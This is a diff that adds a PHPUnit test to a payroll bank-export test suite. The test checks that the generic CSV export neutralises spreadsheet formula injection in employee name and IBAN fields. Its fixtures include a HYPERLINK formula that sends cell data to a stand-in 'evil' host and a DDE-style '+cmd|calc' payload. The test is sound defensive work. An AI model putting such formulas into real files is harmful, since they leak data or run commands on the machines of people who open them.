@@ -229,4 +229,41 @@ class BankExportGeneratorTest extends TestCase
         // Unknown/empty country code technical fallback only, per ticket.
         self::assertSame('DZD', CountryDefaults::for(null)['currency']);
     }
+
+    public function test_csv_generic_neutralizes_csv_formula_injection(): void
+    {
+        // Audit #6556 — nom/IBAN contrôlés par l'employé commençant par
+        // = + - @ doivent être préfixés d'une apostrophe (OWASP).
+        $generator = new BankExportGenerator;
+        $method = new ReflectionMethod($generator, 'generateCsvGeneric');
+        $method->setAccessible(true);
+
+        $run = new PayrollRun;
+        $run->setRawAttributes([
+            'period_start' => Carbon::parse('2026-05-01'),
+            'country_code' => 'MA',
+        ]);
+
+        $employee = (object) [
+            'first_name' => '=HYPERLINK("https://evil/?d="&A1)',
+            'last_name' => '+cmd|calc',
+            'iban' => '@sum(A1:A9)',
+            'bank_account' => '001205000534921',
+        ];
+
+        $slip = new PaySlip;
+        $slip->setRawAttributes([
+            'employee_id' => 42,
+            'net_salary' => 8750.25,
+        ]);
+        $slip->setRelation('employee', $employee);
+
+        $csv = $method->invoke($generator, $run, new Collection([$slip]), 'MAD');
+
+        self::assertStringContainsString("'=HYPERLINK", $csv);
+        self::assertStringContainsString("'+cmd|calc", $csv);
+        self::assertStringContainsString("'@sum", $csv);
+        // le montant numérique n'est pas préfixé
+        self::assertStringContainsString(',8750.25,MAD,2026-05', $csv);
+    }
 }
